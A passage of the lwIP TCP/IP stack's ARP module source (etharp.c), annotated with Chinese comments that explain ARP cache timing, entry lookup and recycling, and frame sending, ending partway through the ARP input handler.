/**
 * @file
 * Address Resolution Protocol module for IP over Ethernet
 *
 * Functionally, ARP is divided into two parts. The first maps an IP address
 * to a physical address when sending a packet, and the second part answers
 * requests from other machines for our physical address.
 *
 * This implementation complies with RFC 826 (Ethernet ARP). It supports
 * Gratuitious ARP from RFC3220 (IP Mobility Support for IPv4) section 4.6
 * if an interface calls etharp_gratuitous(our_netif) upon address change.
 */

/*
 * Copyright (c) 2001-2003 Swedish Institute of Computer Science.
 * Copyright (c) 2003-2004 Leon Woestenberg <leon.woestenberg@axon.tv>
 * Copyright (c) 2003-2004 Axon Digital Design B.V., The Netherlands.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without modification,
 * are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice,
 *    this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR IMPLIED
 * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT
 * SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT
 * OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING
 * IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY
 * OF SUCH DAMAGE.
 *
 * This file is part of the lwIP TCP/IP stack.
 *
 */
 
#include "lwip/opt.h"

#if LWIP_ARP /* don't build if not configured for use in lwipopts.h */

#include "lwip/inet.h"
#include "lwip/ip.h"
#include "lwip/stats.h"
#include "lwip/snmp.h"
#include "lwip/dhcp.h"
#include "lwip/autoip.h"
#include "netif/etharp.h"

#if PPPOE_SUPPORT
#include "netif/ppp_oe.h"
#endif /* PPPOE_SUPPORT */

#include <string.h>

/** the time an ARP entry stays valid after its last update,
 *  for ARP_TMR_INTERVAL = 5000, this is
 *  (240 * 5) seconds = 20 minutes.
 */
/* ARP表稳定表项的最大生存时间，240 * 5 = 20min */
#define ARP_MAXAGE 240
/** the time an ARP entry stays pending after first request,
 *  for ARP_TMR_INTERVAL = 5000, this is
 *  (2 * 5) seconds = 10 seconds.
 * 
 *  @internal Keep this number at least 2, otherwise it might
 *  run out instantly if the timeout occurs directly after a request.
 */
/* ARP表等待ARP回复表项的最大等待时间，2 * 5 = 10s */
#define ARP_MAXPENDING 2

#define HWTYPE_ETHERNET 1

#define ARPH_HWLEN(hdr) (ntohs((hdr)->_hwlen_protolen) >> 8)
#define ARPH_PROTOLEN(hdr) (ntohs((hdr)->_hwlen_protolen) & 0xff)

#define ARPH_HWLEN_SET(hdr, len) (hdr)->_hwlen_protolen = htons(ARPH_PROTOLEN(hdr) | ((len) << 8))
#define ARPH_PROTOLEN_SET(hdr, len) (hdr)->_hwlen_protolen = htons((len) | (ARPH_HWLEN(hdr) << 8))

/* ARP缓存表中一个表项的状态 */
enum etharp_state {
  ETHARP_STATE_EMPTY = 0,
  ETHARP_STATE_PENDING,
  ETHARP_STATE_STABLE
};

/* 每个ARP表项 */
struct etharp_entry {
#if ARP_QUEUEING
  /** 
   * Pointer to queue of pending outgoing packets on this ARP entry.
   */
	/* ARP地址解析时，等待发送的数据包链表 */
  struct etharp_q_entry *q;
#endif
	/* IP地址 */
  struct ip_addr ipaddr;
	/* MAC地址 */
  struct eth_addr ethaddr;
	/* 当前ARP表项的状态 */
  enum etharp_state state;
	/* 该ARP表项的存活时间 */
  u8_t ctime;
	/* 对应的网络接口 */
  struct netif *netif;
};

/* 广播MAC地址 */
const struct eth_addr ethbroadcast = {{0xff,0xff,0xff,0xff,0xff,0xff}};
/* 全0MAC地址，用于ARP请求的ARP包中目的MAC地址 */
const struct eth_addr ethzero = {{0,0,0,0,0,0}};
/* arp缓存表 */
static struct etharp_entry arp_table[ARP_TABLE_SIZE];
#if !LWIP_NETIF_HWADDRHINT
static u8_t etharp_cached_entry;
#endif

/**
 * Try hard to create a new entry - we want the IP address to appear in
 * the cache (even if this means removing an active entry or so). */
#define ETHARP_TRY_HARD 1
#define ETHARP_FIND_ONLY  2

#if LWIP_NETIF_HWADDRHINT
#define NETIF_SET_HINT(netif, hint)  if (((netif) != NULL) && ((netif)->addr_hint != NULL))  \
                                      *((netif)->addr_hint) = (hint);
static s8_t find_entry(struct ip_addr *ipaddr, u8_t flags, struct netif *netif);
#else /* LWIP_NETIF_HWADDRHINT */
static s8_t find_entry(struct ip_addr *ipaddr, u8_t flags);
#endif /* LWIP_NETIF_HWADDRHINT */

static err_t update_arp_entry(struct netif *netif, struct ip_addr *ipaddr, struct eth_addr *ethaddr, u8_t flags);


/* Some checks, instead of etharp_init(): */
#if (LWIP_ARP && (ARP_TABLE_SIZE > 0x7f))
  #error "If you want to use ARP, ARP_TABLE_SIZE must fit in an s8_t, so, you have to reduce it in your lwipopts.h"
#endif


#if ARP_QUEUEING
/**
 * Free a complete queue of etharp entries
 *
 * @param q a qeueue of etharp_q_entry's to free
 */
/* 释放一个ARP表项中待发送数据包队列 */
static void
free_etharp_q(struct etharp_q_entry *q)
{
	/* 待处理节点 */
  struct etharp_q_entry *r;
  LWIP_ASSERT("q != NULL", q != NULL);
  LWIP_ASSERT("q->p != NULL", q->p != NULL);
	/* 遍历链表*/
  while (q) {
    r = q;
		/* 获得下一个节点 */
    q = q->next;
    LWIP_ASSERT("r->p != NULL", (r->p != NULL));
		/* 释放一个pbuf链表 */
    pbuf_free(r->p);
		/* 释放struct etharp_q_entry结构 */
    memp_free(MEMP_ARP_QUEUE, r);
  }
}
#endif

/**
 * Clears expired entries in the ARP table.
 *
 * This function should be called every ETHARP_TMR_INTERVAL microseconds (5 seconds),
 * in order to expire entries in the ARP table.
 */
/* ARP表项定时处理，被应用层5s调用一次 */
void
etharp_tmr(void)
{
  u8_t i;

  LWIP_DEBUGF(ETHARP_DEBUG, ("etharp_timer\n"));
  /* remove expired entries from the ARP table */
	/* 遍历整个ARP表 */
  for (i = 0; i < ARP_TABLE_SIZE; ++i) {
		/* 表项生存时间+1，即增加5s */
    arp_table[i].ctime++;
		/* 稳定状态表项，存在时间大于等于20min
		 * 或者等待ARP回复的表项，存在时间大于等于10s
		 */
    if (((arp_table[i].state == ETHARP_STATE_STABLE) &&
         (arp_table[i].ctime >= ARP_MAXAGE)) ||
        ((arp_table[i].state == ETHARP_STATE_PENDING)  &&
         (arp_table[i].ctime >= ARP_MAXPENDING))) {
         /* pending or stable entry has become old! */
      LWIP_DEBUGF(ETHARP_DEBUG, ("etharp_timer: expired %s entry %"U16_F".\n",
           arp_table[i].state == ETHARP_STATE_STABLE ? "stable" : "pending", (u16_t)i));
      /* clean up entries that have just been expired */
      /* remove from SNMP ARP index tree */
      snmp_delete_arpidx_tree(arp_table[i].netif, &arp_table[i].ipaddr);
#if ARP_QUEUEING
			/* 如果该表项的待发送IP包队列不为空，则释放这些数据包 */
      /* and empty packet queue */
      if (arp_table[i].q != NULL) {
        /* remove all queued packets */
        LWIP_DEBUGF(ETHARP_DEBUG, ("etharp_timer: freeing entry %"U16_F", packet queue %p.\n", (u16_t)i, (void *)(arp_table[i].q)));
        /* 释放待发送的多个pbuf链表和struct etharp_q_entry链表节点占用的内存 */
				free_etharp_q(arp_table[i].q);
				/* 该ARP表项的待发送IP队列设置为空 */
        arp_table[i].q = NULL;
      }
#endif
      /* recycle entry for re-use */
			/* ARP表项设置为空闲 */
      arp_table[i].state = ETHARP_STATE_EMPTY;
    }
#if ARP_QUEUEING
    /* still pending entry? (not expired) */
    if (arp_table[i].state == ETHARP_STATE_PENDING) {
        /* resend an ARP query here? */
    }
#endif
  }
}

/**
 * Search the ARP table for a matching or new entry.
 * 
 * If an IP address is given, return a pending or stable ARP entry that matches
 * the address. If no match is found, create a new entry with this address set,
 * but in state ETHARP_EMPTY. The caller must check and possibly change the
 * state of the returned entry.
 * 
 * If ipaddr is NULL, return a initialized new entry in state ETHARP_EMPTY.
 * 
 * In all cases, attempt to create new entries from an empty entry. If no
 * empty entries are available and ETHARP_TRY_HARD flag is set, recycle
 * old entries. Heuristic choose the least important entry for recycling.
 *
 * @param ipaddr IP address to find in ARP cache, or to add if not found.
 * @param flags
 * - ETHARP_TRY_HARD: Try hard to create a entry by allowing recycling of
 * active (stable or pending) entries.
 *  
 * @return The ARP entry index that matched or is created, ERR_MEM if no
 * entry is found or could be recycled.
 */
/* 根据ipaddr，查找匹配的表项或者建立一个新表项 */
static s8_t
#if LWIP_NETIF_HWADDRHINT
find_entry(struct ip_addr *ipaddr, u8_t flags, struct netif *netif)
#else /* LWIP_NETIF_HWADDRHINT */
find_entry(struct ip_addr *ipaddr, u8_t flags)
#endif /* LWIP_NETIF_HWADDRHINT */
{
	/* old_pending: 最老的缓冲队列为空的pending表项
	 * old_stable: 最老的stable表项
	 */
  s8_t old_pending = ARP_TABLE_SIZE, old_stable = ARP_TABLE_SIZE;
	/* 编号最低的empty表项 */
  s8_t empty = ARP_TABLE_SIZE;
	/* age_pending: old_pending的年龄 
	 * age_stable: old_stable的年龄
	 */
  u8_t i = 0, age_pending = 0, age_stable = 0;
#if ARP_QUEUEING
  /* oldest entry with packets on queue */
	/* 最老的缓冲队列不为空的pending表项 */
  s8_t old_queue = ARP_TABLE_SIZE;
  /* its age */
	/* old_queue的年龄 */
  u8_t age_queue = 0;
#endif

  /* First, test if the last call to this function asked for the
   * same address. If so, we're really fast! */
	/* etharp_cached_entry保存了上次访问的ARP表项的编号 */
  if (ipaddr) {
    /* ipaddr to search for was given */
#if LWIP_NETIF_HWADDRHINT
    if ((netif != NULL) && (netif->addr_hint != NULL)) {
      /* per-pcb cached entry was given */
      u8_t per_pcb_cache = *(netif->addr_hint);
      if ((per_pcb_cache < ARP_TABLE_SIZE) && arp_table[per_pcb_cache].state == ETHARP_STATE_STABLE) {
        /* the per-pcb-cached entry is stable */
        if (ip_addr_cmp(ipaddr, &arp_table[per_pcb_cache].ipaddr)) {
          /* per-pcb cached entry was the right one! */
          ETHARP_STATS_INC(etharp.cachehit);
          return per_pcb_cache;
        }
      }
    }
#else /* #if LWIP_NETIF_HWADDRHINT */
		/* 判断etharp_cached_entry是不是要访问的表项 */
    if (arp_table[etharp_cached_entry].state == ETHARP_STATE_STABLE) {
      /* the cached entry is stable */
			/* 比较成功，则etharp_cached_entry就是要访问的表项，直接返回etharp_cached_entry */
      if (ip_addr_cmp(ipaddr, &arp_table[etharp_cached_entry].ipaddr)) {
        /* cached entry was the right one! */
				/* 统计命中率 */
        ETHARP_STATS_INC(etharp.cachehit);
        return etharp_cached_entry;
      }
    }
#endif /* #if LWIP_NETIF_HWADDRHINT */
  }

  /**
   * a) do a search through the cache, remember candidates
   * b) select candidate entry
   * c) create new entry
   */

  /* a) in a single search sweep, do all of this
   * 1) remember the first empty entry (if any)
   * 2) remember the oldest stable entry (if any)
   * 3) remember the oldest pending entry without queued packets (if any)
   * 4) remember the oldest pending entry with queued packets (if any)
   * 5) search for a matching IP entry, either pending or stable
   *    until 5 matches, or all entries are searched for.
   */

	/* 遍历ARP表 */
  for (i = 0; i < ARP_TABLE_SIZE; ++i) {
    /* no empty entry found yet and now we do find one? */
		/* 第一次找到empty表项，记录其索引 */
    if ((empty == ARP_TABLE_SIZE) && (arp_table[i].state == ETHARP_STATE_EMPTY)) {
      LWIP_DEBUGF(ETHARP_DEBUG, ("find_entry: found empty entry %"U16_F"\n", (u16_t)i));
      /* remember first empty entry */
      empty = i;
    }
    /* pending entry? */
		/* 若当前表项为pending状态 */
    else if (arp_table[i].state == ETHARP_STATE_PENDING) {
      /* if given, does IP address match IP address in ARP entry? */
			/* 判断该pending表项的IP地址是不是要查找的表项 */
      if (ipaddr && ip_addr_cmp(ipaddr, &arp_table[i].ipaddr)) {
        LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("find_entry: found matching pending entry %"U16_F"\n", (u16_t)i));
        /* found exact IP address match, simply bail out */
#if LWIP_NETIF_HWADDRHINT
        NETIF_SET_HINT(netif, i);
#else /* #if LWIP_NETIF_HWADDRHINT */
				/* 找到匹配的pending表项，记录并直接返回 */
        etharp_cached_entry = i;
#endif /* #if LWIP_NETIF_HWADDRHINT */
        return i;
#if ARP_QUEUEING
      /* pending with queued packets? */
			/* 该pending表项不是要查找的表项，且缓冲队列不空，则记录最老的缓冲队列不空的pending表项 */
      } else if (arp_table[i].q != NULL) {
        if (arp_table[i].ctime >= age_queue) {
          old_queue = i;
          age_queue = arp_table[i].ctime;
        }
#endif
			/* 该pending表项不是要查找的表项，且缓冲队列空，则记录最老的缓冲队列空的pending表项 */
      /* pending without queued packets? */
      } else {
        if (arp_table[i].ctime >= age_pending) {
          old_pending = i;
          age_pending = arp_table[i].ctime;
        }
      }        
    }
		/* 当前表项是stable状态 */
    /* stable entry? */
    else if (arp_table[i].state == ETHARP_STATE_STABLE) {
			/* 判断该stable表项的IP地址是不是要查找的表项 */
      /* if given, does IP address match IP address in ARP entry? */
      if (ipaddr && ip_addr_cmp(ipaddr, &arp_table[i].ipaddr)) {
        LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("find_entry: found matching stable entry %"U16_F"\n", (u16_t)i));
        /* found exact IP address match, simply bail out */
#if LWIP_NETIF_HWADDRHINT
        NETIF_SET_HINT(netif, i);
#else /* #if LWIP_NETIF_HWADDRHINT */
				/* IP匹配，则记录后返回 */
        etharp_cached_entry = i;
#endif /* #if LWIP_NETIF_HWADDRHINT */
        return i;
			/* 该stable表项不是要查找的表项，则记录最老的stable表项 */
      /* remember entry with oldest stable entry in oldest, its age in maxtime */
      } else if (arp_table[i].ctime >= age_stable) {
        old_stable = i;
        age_stable = arp_table[i].ctime;
      }
    }
  }
  /* { we have no match } => try to create a new entry */
   
	/* 遍历完成，仍没有找到IP匹配的表项。
	 * 需要创建一个新表项
	 */
	
	/* 如果没有empty表项且没有设置ETHARP_TRY_HARD选项
	 * 或设置了ETHARP_FIND_ONLY选项，则返回错误信息
	 */
  /* no empty entry found and not allowed to recycle? */
  if (((empty == ARP_TABLE_SIZE) && ((flags & ETHARP_TRY_HARD) == 0))
      /* or don't create new entry, only search? */
      || ((flags & ETHARP_FIND_ONLY) != 0)) {
    LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("find_entry: no empty entry found and not allowed to recycle\n"));
    return (s8_t)ERR_MEM;
  }
  
	/* 回收一个pending或者stable的表项，顺序如下： */
  /* b) choose the least destructive entry to recycle:
   * 1) empty entry
   * 2) oldest stable entry
   * 3) oldest pending entry without queued packets
   * 4) oldest pending entry with queued packets
   * 
   * { ETHARP_TRY_HARD is set at this point }
   */ 

  /* 1) empty entry available? */
	/* 首先尝试empty表项 */
  if (empty < ARP_TABLE_SIZE) {
    i = empty;
    LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("find_entry: selecting empty entry %"U16_F"\n", (u16_t)i));
  }
	/* 尝试最老的stable表项，stable表项的.q应该是NULL */
  /* 2) found recyclable stable entry? */
  else if (old_stable < ARP_TABLE_SIZE) {
    /* recycle oldest stable*/
    i = old_stable;
    LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("find_entry: selecting oldest stable entry %"U16_F"\n", (u16_t)i));
#if ARP_QUEUEING
    /* no queued packets should exist on stable entries */
    LWIP_ASSERT("arp_table[i].q == NULL", arp_table[i].q == NULL);
#endif
	/* 尝试最老的缓冲队列空的pending表项 */
  /* 3) found recyclable pending entry without queued packets? */
  } else if (old_pending < ARP_TABLE_SIZE) {
    /* recycle oldest pending */
    i = old_pending;
    LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("find_entry: selecting oldest pending entry %"U16_F" (without queue)\n", (u16_t)i));
#if ARP_QUEUEING
	/* 尝试最老的缓冲队列不空的pending表项 */
  /* 4) found recyclable pending entry with queued packets? */
  } else if (old_queue < ARP_TABLE_SIZE) {
    /* recycle oldest pending */
    i = old_queue;
    LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("find_entry: selecting oldest pending entry %"U16_F", freeing packet queue %p\n", (u16_t)i, (void *)(arp_table[i].q)));
    /* 释放该ARP表项中待发送数据包队列 */
		free_etharp_q(arp_table[i].q);
    arp_table[i].q = NULL;
#endif
    /* no empty or recyclable entries found */
  }
	/* 没有任何可回收的表项，返回错误信息 */
	else {
    return (s8_t)ERR_MEM;
  }

  /* { empty or recyclable entry found } */
  LWIP_ASSERT("i < ARP_TABLE_SIZE", i < ARP_TABLE_SIZE);

  if (arp_table[i].state != ETHARP_STATE_EMPTY)
  {
    snmp_delete_arpidx_tree(arp_table[i].netif, &arp_table[i].ipaddr);
  }
	
	/* 找到了empty或者可回收的表项，初始化该表项 */
  /* recycle entry (no-op for an already empty entry) */
  arp_table[i].state = ETHARP_STATE_EMPTY;

  /* IP address given? */
	/* 设置表项的IP地址 */
  if (ipaddr != NULL) {
    /* set IP address */
    ip_addr_set(&arp_table[i].ipaddr, ipaddr);
  }
	/* 表项的年龄清0 */
  arp_table[i].ctime = 0;
#if LWIP_NETIF_HWADDRHINT
  NETIF_SET_HINT(netif, i);
#else /* #if LWIP_NETIF_HWADDRHINT */
	/* 记录最近使用的表项 */
  etharp_cached_entry = i;
#endif /* #if LWIP_NETIF_HWADDRHINT */
  return (err_t)i;
}

/**
 * Send an IP packet on the network using netif->linkoutput
 * The ethernet header is filled in before sending.
 *
 * @params netif the lwIP network interface on which to send the packet
 * @params p the packet to send, p->payload pointing to the (uninitialized) ethernet header
 * @params src the source MAC address to be copied into the ethernet header
 * @params dst the destination MAC address to be copied into the ethernet header
 * @return ERR_OK if the packet was sent, any other err_t on failure
 */
/* 填写以太网帧头的源MAC和目的MAC、帧类型，并调用netif->linkoutput()把以太网帧发送出去 */
static err_t
etharp_send_ip(struct netif *netif, struct pbuf *p, struct eth_addr *src, struct eth_addr *dst)
{
	/* 以太网帧头指针 */
  struct eth_hdr *ethhdr = p->payload;
  u8_t k;

  LWIP_ASSERT("netif->hwaddr_len must be the same as ETHARP_HWADDR_LEN for etharp!",
              (netif->hwaddr_len == ETHARP_HWADDR_LEN));
	/* 根据实参，填写以太网帧源MAC和目的MAC */
  k = ETHARP_HWADDR_LEN;
  while(k > 0) {
    k--;
    ethhdr->dest.addr[k] = dst->addr[k];
    ethhdr->src.addr[k]  = src->addr[k];
  }
	/* 以太网帧类型 */
  ethhdr->type = htons(ETHTYPE_IP);
  LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_send_ip: sending packet %p\n", (void *)p));
  /* send the packet */
	/* 调用以太网卡驱动，发送填充完成的以太网帧(不包含4字节CRC校验) */
  return netif->linkoutput(netif, p);
}

/**
 * Update (or insert) a IP/MAC address pair in the ARP cache.
 *
 * If a pending entry is resolved, any queued packets will be sent
 * at this point.
 * 
 * @param ipaddr IP address of the inserted ARP entry.
 * @param ethaddr Ethernet address of the inserted ARP entry.
 * @param flags Defines behaviour:
 * - ETHARP_TRY_HARD Allows ARP to insert this as a new item. If not specified,
 * only existing ARP entries will be updated.
 *
 * @return
 * - ERR_OK Succesfully updated ARP cache.
 * - ERR_MEM If we could not add a new ARP entry when ETHARP_TRY_HARD was set.
 * - ERR_ARG Non-unicast address given, those will not appear in ARP cache.
 *
 * @see pbuf_free()
 */
/* 根据从IP包或者从ARP包解析出的MAC-IP的对应关系
 * 更新ARP缓存表中的表项，如果该表项上发送队列不为空，则发送 */
/* ipaddr是表项的IP地址，ethaddr是表项的MAC地址。
 * flags如设置为ETHARP_TRY_HARD，当表中没有空闲表项时，将回收最老的表项，并插入新表项
 */
static err_t
update_arp_entry(struct netif *netif, struct ip_addr *ipaddr, struct eth_addr *ethaddr, u8_t flags)
{
  s8_t i;
  u8_t k;
  LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("update_arp_entry()\n"));
  LWIP_ASSERT("netif->hwaddr_len == ETHARP_HWADDR_LEN", netif->hwaddr_len == ETHARP_HWADDR_LEN);
  LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("update_arp_entry: %"U16_F".%"U16_F".%"U16_F".%"U16_F" - %02"X16_F":%02"X16_F":%02"X16_F":%02"X16_F":%02"X16_F":%02"X16_F"\n",
                                        ip4_addr1(ipaddr), ip4_addr2(ipaddr), ip4_addr3(ipaddr), ip4_addr4(ipaddr), 
                                        ethaddr->addr[0], ethaddr->addr[1], ethaddr->addr[2],
                                        ethaddr->addr[3], ethaddr->addr[4], ethaddr->addr[5]));
  /* non-unicast address? */
	/* IP地址全0，或者是该IP地址是子网的广播地址，或者是多播地址，则返回错误 */
  if (ip_addr_isany(ipaddr) ||
      ip_addr_isbroadcast(ipaddr, netif) ||
      ip_addr_ismulticast(ipaddr)) {
    LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("update_arp_entry: will not add non-unicast IP address to ARP cache\n"));
    return ERR_ARG;
  }
  /* find or create ARP entry */
#if LWIP_NETIF_HWADDRHINT
  i = find_entry(ipaddr, flags, netif);
#else /* LWIP_NETIF_HWADDRHINT */
	/* 根据flags，查找或新建一个ARP表项 */
  i = find_entry(ipaddr, flags);
#endif /* LWIP_NETIF_HWADDRHINT */
  /* bail out if no entry could be found */
	/* 无法查找到对应表项且无法新建表项，则返回错误 */
  if (i < 0)
    return (err_t)i;
  
	/* 把表项状态改为stable
	 * 如果是新建的表项，状态为empty
	 * 如果是找到的IP地址匹配的表项，状态为pending或者stable
	 */
  /* mark it stable */
  arp_table[i].state = ETHARP_STATE_STABLE;
	/* 记录表项对应网络接口 */
  /* record network interface */
  arp_table[i].netif = netif;

  /* insert in SNMP ARP index tree */
  snmp_insert_arpidx_tree(netif, &arp_table[i].ipaddr);

  LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("update_arp_entry: updating stable entry %"S16_F"\n", (s16_t)i));
  /* update address */
	/* 在表项中记录MAC地址 */
  k = ETHARP_HWADDR_LEN;
  while (k > 0) {
    k--;
    arp_table[i].ethaddr.addr[k] = ethaddr->addr[k];
  }
	/* 表项年龄设为0 */
  /* reset time stamp */
  arp_table[i].ctime = 0;
	
	/* 如果表项上有缓冲队列，则发送队列上所有数据包 */
#if ARP_QUEUEING
  /* this is where we will send out queued packets! */
	/* 遍历该ARP表项的发送链表，发送上面所有的pbuf链表 */
  while (arp_table[i].q != NULL) {
    struct pbuf *p;
    /* remember remainder of queue */
    struct etharp_q_entry *q = arp_table[i].q;
    /* pop first item off the queue */
		/* 删除发送链表第一个节点 */
    arp_table[i].q = q->next;
    /* get the packet pointer */
		/* 获取待发送pbuf链表头 */
    p = q->p;
    /* now queue entry can be freed */
		/* 释放发送链表上的struct etharp_q_entry节点 */
    memp_free(MEMP_ARP_QUEUE, q);
    /* send the queued IP packet */
		/* 为IP数据包填写以太网帧头，并发送完整的以太网帧 */
    etharp_send_ip(netif, p, (struct eth_addr*)(netif->hwaddr), ethaddr);
    /* free the queued IP packet */
		/* 释放刚发送的pbuf链表 */
    pbuf_free(p);
  }
#endif
  return ERR_OK;
}

/**
 * Finds (stable) ethernet/IP address pair from ARP table
 * using interface and IP address index.
 * @note the addresses in the ARP table are in network order!
 *
 * @param netif points to interface index
 * @param ipaddr points to the (network order) IP address index
 * @param eth_ret points to return pointer
 * @param ip_ret points to return pointer
 * @return table index if found, -1 otherwise
 */
s8_t
etharp_find_addr(struct netif *netif, struct ip_addr *ipaddr,
         struct eth_addr **eth_ret, struct ip_addr **ip_ret)
{
  s8_t i;

  LWIP_UNUSED_ARG(netif);

#if LWIP_NETIF_HWADDRHINT
  i = find_entry(ipaddr, ETHARP_FIND_ONLY, NULL);
#else /* LWIP_NETIF_HWADDRHINT */
  i = find_entry(ipaddr, ETHARP_FIND_ONLY);
#endif /* LWIP_NETIF_HWADDRHINT */
  if((i >= 0) && arp_table[i].state == ETHARP_STATE_STABLE) {
      *eth_ret = &arp_table[i].ethaddr;
      *ip_ret = &arp_table[i].ipaddr;
      return i;
  }
  return -1;
}

/**
 * Updates the ARP table using the given IP packet.
 *
 * Uses the incoming IP packet's source address to update the
 * ARP cache for the local network. The function does not alter
 * or free the packet. This function must be called before the
 * packet p is passed to the IP layer.
 *
 * @param netif The lwIP network interface on which the IP packet pbuf arrived.
 * @param p The IP packet that arrived on netif.
 *
 * @return NULL
 *
 * @see pbuf_free()
 */
/* 使用IP数据包更新ARP表 */
void
etharp_ip_input(struct netif *netif, struct pbuf *p)
{
  struct eth_hdr *ethhdr;
  struct ip_hdr *iphdr;
  LWIP_ERROR("netif != NULL", (netif != NULL), return;);
  /* Only insert an entry if the source IP address of the
     incoming IP packet comes from a host on the local network. */
  ethhdr = p->payload;
  iphdr = (struct ip_hdr *)((u8_t*)ethhdr + SIZEOF_ETH_HDR);
#if ETHARP_SUPPORT_VLAN
  if (ethhdr->type == ETHTYPE_VLAN) {
    iphdr = (struct ip_hdr *)((u8_t*)ethhdr + SIZEOF_ETH_HDR + SIZEOF_VLAN_HDR);
  }
#endif /* ETHARP_SUPPORT_VLAN */

  /* source is not on the local network? */
  if (!ip_addr_netcmp(&(iphdr->src), &(netif->ip_addr), &(netif->netmask))) {
    /* do nothing */
    return;
  }

  LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE, ("etharp_ip_input: updating ETHARP table.\n"));
  /* update ARP table */
  /* @todo We could use ETHARP_TRY_HARD if we think we are going to talk
   * back soon (for example, if the destination IP address is ours. */
  update_arp_entry(netif, &(iphdr->src), &(ethhdr->src), 0);
}

#define ARP_ATTACK	0
/**
 * Responds to ARP requests to us. Upon ARP replies to us, add entry to cache  
 * send out queued IP packets. Updates cache with snooped address pairs.
 *
 * Should be called for incoming ARP packets. The pbuf in the argument
 * is freed by this function.
 *
 * @param netif The lwIP network interface on which the ARP packet pbuf arrived.
 * @param ethaddr Ethernet address of netif.
 * @param p The ARP packet that arrived on netif. Is freed by this function.
 *
 * @return NULL
 *
 * @see pbuf_free()
 */
/* 1，响应ARP请求，并更新ARP表
 * 2，根据ARP回复，更新ARP表
 * 3，update_arp_entry()会把得到ARP响应的pending表项上的发送队列发送出去
 */
void
etharp_arp_input(struct netif *netif, struct eth_addr *ethaddr, struct pbuf *p)
{
	/* ARP数据包头指针 */
  struct etharp_hdr *hdr;
	/* 以太网帧头指针 */
  struct eth_hdr *ethhdr;
  /* these are aligned properly, whereas the ARP header fields might not be */
	/* 暂存ARP包的源IP和目的IP */
  struct ip_addr sipaddr, dipaddr;
#if ARP_ATTACK == 1
	struct ip_addr ipaddr;
#endif
  u8_t i;
	/* ARP请求是否发给本机 */
  u8_t for_us;
#if LWIP_AUTOIP
  const u8_t * ethdst_hwaddr;
#endif /* LWIP_AUTOIP */

  LWIP_ERROR("netif != NULL", (netif != NULL), return;);
  
  /* drop short ARP packets: we have to check for p->len instead of p->tot_len here
     since a struct etharp_hdr is pointed to p->payload, so it musn't be chained! */
	/* 检查第一个pbuf中的数据长度是否到达ARP包的最小长度
	 * 因为直接使用etharp_hdr指针操作payload中的数据，如果ARP包分装在两个pbuf中，这种
	 * 操作方法将造成指针越界
	 */
  if (p->len < SIZEOF_ETHARP_PACKET) {
    LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE | LWIP_DBG_LEVEL_WARNING,
      ("etharp_arp_input: packet dropped, too short (%"S16_F"/%"S16_F")\n", p->tot_len,
      (s16_t)SIZEOF_ETHARP_PACKET));
		/* 更新统计量 */
    ETHARP_STATS_INC(etharp.lenerr);
    ETHARP_STATS_INC(etharp.drop);
		/* 直接释放该pbuf，丢弃数据包 */
    pbuf_free(p);
    return;
  }

	/* 以太网帧指针 */
  ethhdr = p->payload;
	/* ARP数据包指针 */
  hdr = (struct etharp_hdr *)((u8_t*)ethhdr + SIZEOF_ETH_HDR);
#if ETHARP_SUPPORT_VLAN
  if (ethhdr->type == ETHTYPE_VLAN) {
    hdr = (struct etharp_hdr *)(((u8_t*)ethhdr) + SIZEOF_ETH_HDR + SIZEOF_VLAN_HDR);
  }
#endif /* ETHARP_SUPPORT_VLAN */

  /* RFC 826 "Packet Reception": */
	/* 检查ARP数据包和以太网帧各字段有效性 */
  if ((hdr->hwtype != htons(HWTYPE_ETHERNET)) ||
      (hdr->_hwlen_protolen != htons((ETHARP_HWADDR_LEN << 8) | sizeof(struct ip_addr))) ||
      (hdr->proto != htons(ETHTYPE_IP)) ||
      (ethhdr->type != htons(ETHTYPE_ARP)))  {
    LWIP_DEBUGF(ETHARP_DEBUG | LWIP_DBG_TRACE | LWIP_DBG_LEVEL_WARNING,
      ("etharp_arp_input: packet dropped, wrong hw type, hwlen, proto, protolen or ethernet type (%"U16_F"/%"U16_F"/%"U16_F"/%"U16_F"/%"U16_F")\n",
      hdr->hwtype, ARPH_HWLEN(hdr), hdr->proto, ARPH_PROTOLEN(hdr), ethhdr->type));
    ETHARP_STATS_INC(etharp.proterr);
    ETHARP_STATS_INC(etharp.drop);
